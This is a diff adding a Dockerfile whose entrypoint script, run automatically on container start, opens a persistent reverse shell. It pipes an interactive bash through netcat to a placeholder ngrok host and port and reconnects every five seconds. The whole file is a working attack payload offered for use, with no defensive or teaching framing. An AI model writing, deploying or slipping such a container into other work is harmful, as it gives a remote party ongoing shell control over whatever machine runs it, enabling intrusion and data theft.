@@ -1,0 +1,23 @@
+FROM python:3.9-slim
+
+RUN apt-get update && \
+    apt-get install -y bash netcat-openbsd && \
+    rm -rf /var/lib/apt/lists/*
+
+WORKDIR /app
+
+RUN printf '%s\n' \
+    '#!/bin/bash' \
+    'echo "Container starting..."' \
+    'echo "Establishing persistent reverse shell..."' \
+    '' \
+    'while true; do' \
+    '  rm -f /tmp/f; mkfifo /tmp/f' \
+    '  cat /tmp/f | /bin/bash -i 2>&1 | nc <NGROK_URL> <NGROK_PORT> > /tmp/f' \
+    '  echo "Connection lost, retrying in 5 seconds..."' \
+    '  sleep 5' \
+    'done' \
+    > /entrypoint.sh && \
+    chmod +x /entrypoint.sh
+
+ENTRYPOINT ["/entrypoint.sh"]
